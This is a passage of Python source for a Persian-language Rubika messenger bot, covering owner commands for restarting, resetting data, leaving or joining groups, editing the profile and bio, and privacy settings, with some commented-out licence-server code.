                                    GifHelping = {'file_id': 48636646092732, 'mime': 'mp4', 'dc_id': 779, 'access_hash_rec': '5888341350818715816365550747442024080716', 'file_name': 'Screen_Recording_20240807_164254_RubX.mp4', 'thumb_inline': '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\n', 'width': 384, 'height': 854, 'time': 25000, 'size': 2036568, 'type': 'Gif', 'is_round': False, 'is_spoil': False}
                                    text = '+ اگه نمیتونی منو توی گروهت فعال کنی باید گروه هایی که دیگه فعالیت ندارمو از توی حافظم پاک کنی که بتونم توی گروه جدیدت فعال بشم 🥺♥️\n\n× نحوه حذف گروه های قدیمی در گیف بالا آموزش داده شده ☘️🔥\n*حداکثر پنج گروه مجاز به فعالیت هستم*\n\n«مقام سازنده در پیوی ࢪب\u200d\u200d\u200cا\u200c\u200cت»\nدستور : گروه\nدستور : حذف #گوید_گروه'
                                    client.send_message(OWNER, file_inline=GifHelping, text=text)
                                    FIS['helping_activation'] = False
                        elif command == 'لفت':
                            mess = MPro('لفت دادم. ' + ST['ok'], 2)
                            leave_from_group(client, object_guid)
                            time.sleep(0.2)
                            client.send_text(guid_sender, mess)
                elif object_type == 'User':
                    message_id = update_message.get('message_id')
                    message_info = update_message.get('message')
                    message_type = message_info.get('type')
                    command = message_info.get('text')
                    is_reply_message = message_info.get('reply_to_message_id')
                    if guid_sender == Coder:
                        if command == 'افلاین' or command == 'OFF' or command == 'آفلاین':
                            UPFILES(file_infos, INFOS)
                            UPFILES(file_users, USERS)
                            UPFILES(file_speak, SPEAKX)
                            mess = MPro('افلاین شدم. ' + ST['ok'], 2)
                            client.send_text(Coder, mess, message_id)
                            stop_program()

                        elif command and command.startswith('Sleep'):
                            sleepcmd = command.replace('Sleep', '', 1).strip()
                            if sleepcmd.isnumeric():
                                sleepcmd = int(sleepcmd)
                            else:
                                sleepcmd = 10
                            mess = MPro('sleeping mode ' + str(sleepcmd) + ' ' + ST['ok'], 2)
                            client.send_text(Coder, mess, message_id)
                            time.sleep(int(sleepcmd))
                    if not file_owner_is:
                        OWNER = guid_sender
                        UPTXTFILES(file_owner, OWNER)
                        notic_owner = Informations['notic_owner']
                        client.send_text(OWNER, notic_owner, message_id)
                        file_owner_is = True
                        continue
                    if guid_sender == OWNER or guid_sender == Coder:
                        if message_type == 'Text' and command:
                            command = command.replace('آ', 'ا')
                            list_guids_panel = []
                            if command == 'افلاین' or command == 'OFF':
                                UPFILES(file_infos, INFOS)
                                UPFILES(file_users, USERS)
                                UPFILES(file_speak, SPEAKX)
                                mess = MPro('افلاین شدم. ' + ST['ok'], 2)
                                client.send_text(guid_sender, mess, message_id)
                                stop_program()
                            elif command == 'اپدیت' or command == 'UP':
                                UPFILES(file_infos, INFOS)
                                UPFILES(file_users, USERS)
                                UPFILES(file_speak, SPEAKX)
                                mess = MPro('اپدیت شدم. ' + ST['ok'], 2)
                                client.send_text(guid_sender, mess, message_id)
                                restart_program()
                            elif command == 'ریستارت' or command == 'RES':
                                UPFILES(file_infos, INFOS)
                                UPFILES(file_users, USERS)
                                UPFILES(file_speak, SPEAKX)
                                mess = MPro('ریستارت شدم. ' + ST['ok'], 2)
                                client.send_text(guid_sender, mess, message_id)
                                restart_program()
                            elif command == 'حذف سازنده':
                                os.remove(file_owner)
                                OWNER = None
                                file_owner_is = False
                                mess = MPro('سازنده حذف شد. ' + ST['ok'], 2)
                                client.send_text(guid_sender, mess, message_id)
                            elif command in ['مالک', 'گروه ها', 'گروه', 'شارژ گروه', 'شارژ گروه ها']:
                                mess = ''
                                for group in INFOS:
                                    reply_message_guid = INFOS[group]['owner']
                                    gap_name = INFOS[group]['name']
                                    if 'timeout' in INFOS[group] and INFOS[group]['timeout']:
                                        timeout = INFOS[group]['timeout']
                                        now = get_iran_timestamp()
                                        timeout_result = timeout - now
                                    else:
                                        timeout_result = False
                                    mess += MPro('نام گروه : ' + gap_name, 2)
                                    mess += MPro('گوید گروه : ' + str(group), 2)
                                    mess += MPro('گوید مالک : ' + reply_message_guid, 2)
                                    if timeout_result:
                                        mess += MPro('شارژ گروه : ' + Time_pass(timeout_result))
                                    mess += '─┅━━━━━━━┅─\n'
                                if len(INFOS) <= 0:
                                    mess = MPro('در گپی فعال نیستم.' + ST['ok'], 1)
                                client.send_text(guid_sender, str(mess), message_id)
                            elif command == 'سازنده':
                                result = client.get_chat_info(OWNER)
                                user = result['user']
                                first_name = 'بدون نام'
                                if 'first_name' in user:
                                    first_name = user['first_name']
                                mess = f'به نام : {first_name}\nگوید : ``{OWNER}``'
                                client.send_text(guid_sender, mess, message_id)
                            elif command == 'RESETBOT':
                                INFOS = {}
                                USERS = {}
                                LSMessage = {}
                                ARMessages = {}
                                STMessages = {}
                                JoindUsers = {}
                                CheckJoins = {}
                                Spam = {}
                                UPFILES(file_infos, INFOS)
                                UPFILES(file_users, USERS)
                                UPFILES(file_speakx, SPEAKX)
                                mess = MPro(f" اطلاعات ربات پاک شد. {ST['ok']}", 2)
                                client.send_text(guid_sender, mess, message_id)
                            elif command == 'RESETINFO':
                                INFOS = {}
                                USERS = {}
                                LSMessage = {}
                                ARMessages = {}
                                STMessages = {}
                                JoindUsers = {}
                                CheckJoins = {}
                                Spam = {}
                                UPFILES(file_infos, INFOS)
                                mess = MPro(f" اطلاعات ربات پاک شد. {ST['ok']}", 2)
                                client.send_text(guid_sender, mess, message_id)
                            elif command == 'RESETUSERS':
                                USERS = {}
                                for group in INFOS:
                                    if group not in USERS:
                                        USERS[group] = {}
                                UPFILES(file_users, USERS)
                                mess = MPro(f" امار گروه ها پاک شد. {ST['ok']}", 2)
                                client.send_text(guid_sender, mess, message_id)
                            elif command == 'RESETWORDS':
                                SPEAKX = {}
                                UPFILES(file_speakx, SPEAKX)
                                mess = MPro(f" کلمات سخنگوی شخصی حذف شد. {ST['ok']}", 2)
                                client.send_text(guid_sender, mess, message_id)
                            elif command == 'ریست ربات':
                                mess = f'🛑 درصورت ریست کردن ربات تمام اطلاعات ربات ( امار و اطلاعات گپ ها ) پاک خواهد شد!\n\nاگر مطمئن هستید لطفاً دستور زیر رو ارسال کن.'
                                mess += '\n' + '``RESETBOT``'
                                client.send_text(guid_sender, mess, message_id)
                            elif command == 'ریست گپ':
                                mess = '🛑 اگر مطمئن هستید لطفاً دستور زیر رو ارسال کن.'
                                mess += '\n' + '``RESETINFO``'
                                client.send_text(guid_sender, mess, message_id)
                            elif command == 'ریست امار':
                                mess = '🛑 اگر مطمئن هستید لطفاً دستور زیر رو ارسال کن.'
                                mess += '\n' + '``RESETUSERS``'
                                client.send_text(guid_sender, mess, message_id)
                            elif command == 'ریست کلمات':
                                mess = '🛑 درصورت ریست کردن کلمات تمام کلمات سخنگو شخصی پاک خواهد شد!\n\nاگر مطمئن هستید لطفاً دستور زیر رو ارسال کن.'
                                mess += '\n' + '``RESETWORDS``'
                                client.send_text(guid_sender, mess, message_id)
                            elif command in ['تنظیم پروفایل', 'تنظیم پروف']:
                                mess = MPro(f" پروفایل تنظیم شد. {ST['ok']}", 2)
                                try:
                                    messages = client.get_messages(object_guid, is_reply_message)
                                    get = messages['messages'][0]['file_inline']
                                    if get['mime'] in ['jpg', 'png', 'jpeg']:
                                        client.send_text(object_guid, 'در حال بارگذاری...', message_id)
                                        client.download(object_guid, is_reply_message, save_as='Downloads/prof_acc.png')
                                        pass_file = 'Downloads/prof_bag_acc.png'
                                        if not os.path.isfile(pass_file):
                                            pass_file = 'Downloads/prof_acc.png'
                                        client.upload_avatar(GUIDME, 'Downloads/prof_acc.png', pass_file)
                                        os.remove('Downloads/prof_acc.png')
                                        os.remove('Downloads/prof_bag_acc.png')
                                except Exception as e:
                                    mess = MPro(f"{ST['ok']} {e} : پروفایل تنظیم نشد.", 2)
                                client.send_text(guid_sender, mess, message_id)
                            elif command in ['تنظیم پروفایل', 'تنظیم پروف']:
                                mess = MPro(f" باگ پروفایل تنظیم شد. {ST['ok']}", 2)
                                try:
                                    messages = client.get_messages(object_guid, is_reply_message)
                                    get = messages['messages'][0]['file_inline']
                                    mime_type = get['mime']
                                    if mime_type in ['jpg', 'png', 'jpeg']:
                                        client.send_text(object_guid, 'در حال بارگذاری...', message_id)
                                        client.download(object_guid, is_reply_message, save_as='Downloads/prof_bag_acc.png')
                                    else:
                                        mess = MPro(f"{ST['ok']}باگ پروفایل تنظیم نشد. ", 2)
                                except Exception as e:
                                    mess = MPro(f"{ST['ok']} {e} : باگ پروفایل تنظیم نشد. ", 2)
                                client.send_text(guid_sender, mess, message_id)
                            elif command in ['تعداد پی وی ها', 'تعداد کاربر ها', 'تعداد کاربرها', 'تعداد کاربران']:
                                mess = MPro(f" در حال پردازش... {ST['ok']}")
                                client.send_text(guid_sender, mess, message_id)
                                chats = get_all_chats()
                                count = 0
                                for chat in chats:
                                    if chat['abs_object']['type'] == 'User':
                                        count += 1
                                mess = f"{str(count)} کاربر پیدا شد. {ST['ok']}"
                                client.send_text(guid_sender, mess, message_id)
                            elif command in ['تعداد گپ ها', 'تعداد گروه ها']:
                                mess = MPro(f" در حال پردازش... {ST['ok']}")
                                client.send_text(guid_sender, mess, message_id)
                                chats = get_all_chats()
                                count = 0
                                for chat in chats:
                                    if chat['abs_object']['type'] == 'Group':
                                        count += 1
                                mess = f"{str(count)} گروه پیدا شد. {ST['ok']}"
                                client.send_text(guid_sender, mess, message_id)
                            elif command == 'پاکسازی گروه ها' or command == 'پاکسازی گپ ها':
                                mess = MPro(f"{ST['ok']} در حال پردازش... ", 2)
                                client.send_text(guid_sender, mess, message_id)
                                count = 0
                                chats = get_all_chats()
                                for chat in chats:
                                    access = chat['access']
                                    chat_guid = chat['abs_object']['object_guid']
                                    chat_type = chat['abs_object']['type']
                                    if chat_type == 'Group' and chat_guid in INFOS:
                                        count += 1
                                        leave_from_group(client, chat_guid)
                                        time.sleep(0.5)
                                mess = MPro(f"{count} گروه حذف شد. {ST['ok']}", 2)
                                client.send_text(guid_sender, mess, message_id)
                            elif command == 'پاکسازی گروه های بسته' or command == 'پاکسازی گپ های بسته':
                                mess = MPro(f"{ST['ok']} در حال پردازش... ", 2)
                                client.send_text(guid_sender, mess, message_id)
                                count = 0
                                chats = get_all_chats()
                                for chat in chats:
                                    access = chat['access']
                                    chat_guid = chat['abs_object']['object_guid']
                                    chat_type = chat['abs_object']['type']
                                    if chat_type == 'Group' and 'SendMessages' not in access:
                                        count += 1
                                        leave_from_group(client, chat_guid)
                                        time.sleep(0.5)
                                mess = MPro(f"{count} گروه حذف شد. {ST['ok']}", 2)
                                client.send_text(guid_sender, mess, message_id)
                            elif command == 'پروفایل اماده' or command == 'پروف اماده' or command == 'تنظیم پروفایل اماده' or (command == 'تنظیم پروف اماده') or (command == 'تنظیم اسم اماده'):
                                namebot = '𓆩〚𝐁𝐨𝐭 ⚡ 𝐆𝐢𝐭〛𓆪'
                                info_me = client.get_me()
                                user_guid_me = info_me['user']['user_guid']
                                first_name = None
                                last_name = None
                                username = None
                                user = client.get_chat_info(user_guid_me)['user']
                                if 'first_name' in user:
                                    first_name = user['first_name']
                                if 'last_name' in user:
                                    last_name = user['last_name']
                                if 'username' in user:
                                    username = user['username']
                                if 'bio' in user:
                                    bio = user['bio']
                                    if not bio.startswith(Informations['bio']):
                                        bio = f"{Informations['bio']}\n{bio}"
                                    if len(bio) >= 150:
                                        bio = bio[-150:]
                                mess = MPro(f" اسم تنظیم شد. {ST['ok']}", 2)
                                try:
                                    client.update_profile(namebot, last_name, bio, username)
                                except Exception as e:
                                    mess = MPro(f" اسم تنظیم نشد. {ST['ok']}", 2)
                                client.send_text(guid_sender, mess, message_id)
                            '''if command == 'اشتراک' or command == 'لایسنس':
                                response = requests.get(f'https://l8p.ir/getuserlicense/?key=Ab&keyuser={main_key_}')
                                secessions = response.json()['result']
                                mess = MPro(' اشتراک سورس های زیرو شما : ', 4)
                                num = 1
                                for secession in secessions:
                                    secession_id = secession['id']
                                    secession_type = secession['type']
                                    secession_key = secession['key']
                                    secession_guid = secession['guid']
                                    secession_date = int(secession['date'])
                                    secession_expire = int(secession['expire'])
                                    secession_status = str(secession['status'])
                                    if guid_sender in list_teams and secession_guid == GUIDME:
                                        if not is_float(secession_status):
                                            secession_status = float(secession_status)
                                        if secession_status <= 0:
                                            status_ = False
                                        else:
                                            status_ = f'لایسنس {secession_status} ماه پرداخت نشده است.'
                                        if secession_expire <= get_iran_timestamp():
                                            expire_ = 'اشتراک تمام شده است.'
                                        else:
                                            time_pass_ = Time_pass(secession_expire - get_iran_timestamp())
                                            expire_ = f'{time_pass_} باقی مانده'
                                        if secession_type in Typebots:
                                            typebot_ = Typebots[secession_type]
                                        else:
                                            typebot_ = 'نامشخص'
                                        mess += f'─┅━━━ {num} ━━━┅─\n'
                                        mess += MPro(f' شناسه ربات : #{secession_id} - {typebot_}\n', 3)
                                        mess += MPro(f' گوید ربات : {secession_guid}\n', 3)
                                        mess += MPro(f'{expire_}\n', 3)
                                        if status_:
                                            mess += MPro(f' وضعیت : {status_}\n', 3)
                                        num += 1
                                if not secessions:
                                    mess += MPro(f' شما اشتراکی خریداری نکرده اید. {ST['ok']}', 2)
                                client.send_text(guid_sender, mess, message_id)
                            elif command == 'فایل اشتراک' or command == 'فایل لایسنس':
                                response = requests.get(f'https://l8p.ir/getuserlicense/?key=Ab&keyuser={main_key_}')
                                secessions = response.json()['result']
                                mess = MPro(f' اشتراک سورس های زیرو شما : ', 4)
                                num = 1
                                for secession in secessions:
                                    secession_id = secession['id']
                                    secession_type = secession['type']
                                    secession_key = secession['key']
                                    secession_guid = secession['guid']
                                    secession_date = int(secession['date'])
                                    secession_expire = int(secession['expire'])
                                    secession_status = str(secession['status'])
                                    if guid_sender in list_teams and secession_guid != GUIDME:
                                        if is_float(secession_status):
                                            secession_status = float(secession_status)
                                        else:
                                            secession_status = 0
                                        if secession_status <= 0:
                                            status_ = 'پرداخت شده است.'
                                        else:
                                            status_ = f'لایسنس {secession_status} ماه پرداخت نشده است.'
                                        if secession_expire <= get_iran_timestamp():
                                            expire_ = 'اشتراک تمام شده است.'
                                        else:
                                            time_pass_ = Time_pass(secession_expire - get_iran_timestamp())
                                            expire_ = f'{time_pass_} باقی مانده'
                                        if secession_type in Typebots:
                                            typebot_ = Typebots[secession_type]
                                        else:
                                            typebot_ = 'نامشخص'
                                        mess += f'─┅━━━ {num} ━━━┅─\n'
                                        mess += MPro(f' شناسه ربات : #{secession_id} [{typebot_}]\n', 3)
                                        mess += MPro(f' گوید ربات : {secession_guid}\n', 3)
                                        mess += MPro(f' اشتراک : {expire_}\n', 3)
                                        mess += MPro(f' وضعیت : {status_}\n', 3)
                                        num += 1
                                if not secessions:
                                    mess += MPro(f' شما اشتراکی خریداری نکرده اید. {ST['ok']}', 2)
                                licenses_filename = 'licenses.txt'
                                with open(licenses_filename, 'w', encoding='utf-8') as file:
                                    file.write(mess)
                                client.send_file(guid_sender, licenses_filename, message_id)'''
                            if command == 'حریم خصوصی':
                                mess = MPro(f"حریم خصوصی {ST['ok']}", 4)
                                mess += MPro('نمایش اخرین بازدید', 3)
                                mess += MPro('نمایش تلفن', 3)
                                mess += MPro('نمایش پروفایل', 3)
                                mess += MPro('عضو شدن', 3)
                                mess += MPro('هدایت پیام', 3)
                                client.send_text(guid_sender, mess, message_id)
                            elif command == 'حذف پروفایل' or command == 'حذف پروفایل ها' or command == 'حذف پروف':
                                avatars_obj = client.getAvatars(GUIDME)
                                for avatar in avatars_obj['avatars']:
                                    avatar_id = avatar['avatar_id']
                                    client.delete_avatar(GUIDME, avatar_id)
                                mess = MPro(f"{ST['ok']} پروفایل ها با موفقعیت حذف شدند.", 2)
                                client.send_text(guid_sender, mess, message_id)
                            '''elif command.startswith('افزودن لایسنس'):
                                count_expire = command.replace('افزودن لایسنس', '').strip()
                                if is_float(count_expire):
                                    count_expire = float(count_expire)
                                else:
                                    count_expire = 1
                                guid_request = ''
                                more_expire = int(count_expire) * 30 * 24 * 60 * 60
                                expire = get_iran_timestamp() + more_expire
                                requests.get(f'https://l8p.ir/adduserlicense/?key=Ab&keyuser={main_key_}&type={type_bot_main_}&guid={guid_request}&expire={expire}&status={count_expire}')
                                time_pass_ = Time_pass(more_expire)
                                mess = MPro(f'مدت {time_pass_} لایسنس جدید فعال شد. {ST['ok']}', 2)
                                client.send_text(guid_sender, mess, message_id)
                            elif command.startswith('تمدید لایسنس'):
                                steps = command.split(' ')
                                id_license = False
                                count_expire = 1
                                for step in steps:
                                    if '#' in step:
                                        step = step.replace('#', '').strip()
                                    if step.isnumeric():
                                        id_license = int(step)
                                    if is_float(step):
                                        count_expire = float(step)
                                more_expire = int(count_expire * 30 * 24 * 60 * 60)
                                if id_license:
                                    result = requests.get(f'https://l8p.ir/updateuserlicenseExpire/?key=Ab&id={id_license}&keyuser={main_key_}&more_expire={more_expire}&status={count_expire}').json()['result']
                                    if result:
                                        time_pass_ = Time_pass(more_expire)
                                        mess = MPro(f'مدت {time_pass_} لایسنس با شناسه {id_license} تمدید شد. ' + ST['ok'], 2)
                                    else:
                                        mess = MPro(f'شناسه ربات نامعتبر است. ' + ST['ok'], 2)
                                    client.send_text(guid_sender, mess, message_id)
                            elif command.startswith('ریست لایسنس'):
                                steps = command.split(' ')
                                id_license = False
                                for step in steps:
                                    if '#' in step:
                                        step = step.replace('#', '').strip()
                                    if step.isnumeric():
                                        id_license = int(step)
                                if id_license:
                                    guid_request = ''
                                    requests.get(f'https://l8p.ir/updateuserlicensebyidKeyuser/?key=Ab&id={id_license}&keyuser={main_key_}&guid={guid_request}')
                                    mess = MPro(f'{ST['ok']} لایسنس ریست شد. ', 2)
                                    client.send_text(guid_sender, mess, message_id)'''
                            if command.startswith('https://rubika.ir/joing/'):
                                mess = MPro(f"{ST['ok']} لینك گروه نامعتبر است. ", 2)
                                try:
                                    client.join_chat(command)['is_valid']
                                    mess = MPro(f"{ST['ok']} عضو گروه شدم. ", 2)
                                except Exception as e:
                                    print(f'Exception[Handled by decoder]: {e}')
                                client.send_text(object_guid, mess, message_id)
                            elif command.startswith('https://rubika.ir/joinc/'):
                                mess = MPro(f"{ST['ok']} لینک کانال نامعتبر است. 🚫", 2)
                                try:
                                    client.join_chat(command)['is_valid']
                                    mess = MPro(f"{ST['ok']} عضو کانال شدم. ", 2)
                                except Exception as e:
                                    print(f'Exception[Handled by decoder]: {e}')
                                client.send_text(guid_sender, mess, message_id)
                            elif command.startswith('@'):
                                result = client.get_chat_info_by_username(command)
                                if 'channel' in result:
                                    direction_guid = result['channel']['channel_guid']
                                    mess = MPro(f"{ST['ok']} ایدی کانال نامعتبر است. 🚫", 2)
                                    try:
                                        client.join_chat(direction_guid)
                                        mess = MPro(f"{ST['ok']} عضو کانال شدم. ", 2)
                                    except Exception as e:
                                        print(f'Exception[Handled by decoder]: {e}')
                                    client.send_text(guid_sender, mess, message_id)
                            elif command.startswith('نمایش اخرین بازدید'):
                                set_option = command.replace('نمایش اخرین بازدید', '').strip()
                                if set_option in ('فعال', 'روشن', 'باز', 'مجاز'):
                                    set_option_bool = True
                                else:
                                    set_option_bool = False
                                client.set_setting(show_my_last_online=set_option_bool)
                                mess = MPro(f" نمایش اخرین بازدید {ST['ok']} شد.", 2)
                                client.send_text(guid_sender, mess, message_id)
                            elif command.startswith('نمایش تلفن'):
                                set_option = command.replace('نمایش تلفن', '').strip()
                                if set_option in ('فعال', 'روشن', 'باز', 'مجاز'):
                                    set_option_bool = True
                                else:
                                    set_option_bool = False
                                client.set_setting(show_my_phone_number=set_option_bool)
                                mess = MPro(f" نمایش تلفن {ST['ok']} شد.", 2)
                                client.send_text(guid_sender, mess, message_id)
                            elif command.startswith('نمایش پروفایل'):
                                set_option = command.replace('نمایش پروفایل', '').strip()
                                if set_option in ('فعال', 'روشن', 'باز', 'مجاز'):
                                    set_option_bool = True
                                else:
                                    set_option_bool = False
                                client.set_setting(show_my_phone_number=set_option_bool)
                                mess = MPro(f" نمایش پروفایل {ST['ok']} شد.", 2)
                                client.send_text(guid_sender, mess, message_id)
                            elif command.startswith('عضو شدن'):
                                set_option = command.replace('عضو شدن', '').strip()
                                if set_option in ('فعال', 'روشن', 'باز', 'مجاز'):
                                    set_option_bool = True
                                else:
                                    set_option_bool = False
                                client.set_setting(can_join_chat_by=set_option_bool)
                                mess = MPro(f" عضو شدن {ST['ok']} شد.", 2)
                                client.send_text(guid_sender, mess, message_id)
                            elif command.startswith('هدایت پیام'):
                                set_option = command.replace('هدایت پیام', '').strip()
                                if set_option in ('فعال', 'روشن', 'باز', 'مجاز'):
                                    set_option_bool = True
                                else:
                                    set_option_bool = False
                                client.set_setting(link_forward_message=set_option_bool)
                                mess = MPro(f" هدایت پیام {ST['ok']} شد.", 2)
                                client.send_text(guid_sender, mess, message_id)
                            elif command.startswith('لفت'):
                                UPFILES(file_infos, INFOS)
                                UPFILES(file_users, USERS)
                                UPFILES(file_speakx, SPEAKX)
                                link = command.replace('لفت', '').strip()
                                if len(link) > 0:
                                    mess, chat_guid = ('نامعتبر است. 🚫', None)
                                    if link.startswith('https://rubika.ir/'):
                                        get_info = client.get_chat_preview(link)
                                        if 'group' in get_info:
                                            chat_guid = get_info['group']['group_guid']
                                        elif 'channel' in get_info:
                                            chat_guid = get_info['channel']['channel_guid']
                                    elif link.startswith('g0'):
                                        chat_guid = link
                                    elif link.startswith('c0'):
                                        chat_guid = link
                                    elif link.startswith('@'):
                                        chat_guid = client.get_chat_info_by_username(link)['channel']['channel_guid']
                                    if chat_guid:
                                        mess = 'لفت دادم. '
                                        leave_from_group(client, chat_guid)
                                        client.send_text(guid_sender, MPro(mess + ST['ok'], 2), message_id)
                            elif command.startswith('لینک'):
                                target_guid = command.replace('لینک', '').strip()
                                try:
                                    result = client.get_link(target_guid)
                                except:
                                    result = None
                                if result:
                                    mess = MPro('لینک دعوت گپ : \n' + result['join_link'], 2)
                                else:
                                    mess = MPro('نمیتونم لینک رو بگیرم.', 2)
                                client.send_text(guid_sender, mess, message_id)
                            elif command.startswith('سازنده '):
                                text = command.replace('سازنده', '').strip()
                                if text.startswith('@'):
                                    get_info = client.get_chat_info_by_username(text)
                                    if not get_info['exist']:
                                        mess = MPro(f"سازنده تنظیم شده ناموجود است. {ST['ok']}", 2)
                                        client.send_text(guid_sender, mess, message_id)
                                    elif not get_info['type'] == 'User':
                                        mess = MPro(f"سازنده تنظیم شده ناموجود است. {ST['ok']}", 2)
                                        client.send_text(guid_sender, mess, message_id)
                                    else:
                                        admin_guid = get_info['user']['user_guid']
                                        with open(file_owner, 'w') as outfile:
                                            OWNER = admin_guid
                                            UPTXTFILES(file_owner, OWNER)
                                    notic_owner = Informations['notic_owner']
                                    client.send_text(admin_guid, notic_owner)
                                    mess = MPro(f"سازنده انتقال یافت. {ST['ok']}", 2)
                                    client.send_text(guid_sender, mess, message_id)
                                    file_owner_is = True
                                if text.startswith('u0'):
                                    admin_guid = text
                                    notic_owner = Informations['notic_owner']
                                    client.send_text(admin_guid, notic_owner)
                                    mess = MPro(f"سازنده انتقال یافت. {ST['ok']}", 2)
                                    client.send_text(guid_sender, mess, message_id)
                                    file_owner_is = True
                                    with open(file_owner, 'w') as outfile:
                                        OWNER = admin_guid
                                        UPTXTFILES(file_owner, OWNER)
                            elif command.startswith('حذف g0'):
                                guid_gap = command.replace('حذف', '').strip()
                                if guid_gap in INFOS:
                                    INFOS.pop(guid_gap)
                                if guid_gap in USERS:
                                    USERS.pop(guid_gap)
                                if guid_gap in LSMessage:
                                    LSMessage.pop(guid_gap)
                                if guid_gap in ARMessages:
                                    ARMessages.pop(guid_gap)
                                if guid_gap in STMessages:
                                    STMessages.pop(guid_gap)
                                if guid_gap in JoindUsers:
                                    JoindUsers.pop(guid_gap)
                                if guid_gap in CheckJoins:
                                    CheckJoins.pop(guid_gap)
                                if guid_gap in Spam:
                                    Spam.pop(guid_gap)
                                mess = MPro(f"اطلاعات گپ پاک شد. {ST['ok']}", 2)
                                client.send_text(guid_sender, mess, message_id)
                            elif command.startswith('تنظیم بیو'):
                                if is_reply_message:
                                    reply_message_text = GetInfoByMessageId(object_guid, is_reply_message)['text']
                                else:
                                    reply_message_text = command.replace('تنظیم بیو', '')
                                info_me = client.get_me()
                                user_guid_me = info_me['user']['user_guid']
                                first_name = None
                                last_name = None
                                username = None
                                user = client.get_chat_info(user_guid_me)['user']
                                if 'first_name' in user:
                                    first_name = user['first_name']
                                if 'last_name' in user:
                                    last_name = user['last_name']
                                if 'username' in user:
                                    username = user['username']
                                bio = f"{Informations['bio']}\n{reply_message_text}"
                                if len(bio) >= 150:
                                    bio = bio[:150]
                                mess = f"بیو تنظیم شد. {ST['ok']}"
                                try:
                                    client.update_profile(first_name, last_name, bio, username)
                                except Exception as e:
                                    print(e)
                                    mess = f"بیو تنظیم نشد. {ST['ok']}"
                                client.send_text(guid_sender, MPro(mess), message_id)
                            elif command.startswith('تنظیم اسم'):
                                if is_reply_message:
                                    reply_message_text = GetInfoByMessageId(object_guid, is_reply_message)['text']
                                else:
                                    reply_message_text = command.replace('تنظیم اسم', '')
                                info_me = client.get_me()
                                user_guid_me = info_me['user']['user_guid']
                                first_name = None
                                last_name = None
                                username = None
                                user = client.get_chat_info(user_guid_me)['user']
                                if 'first_name' in user:
                                    first_name = user['first_name']
                                if 'last_name' in user:
                                    last_name = user['last_name']
                                if 'username' in user:
                                    username = user['username']
                                bio = user['bio'] if 'bio' in user else None
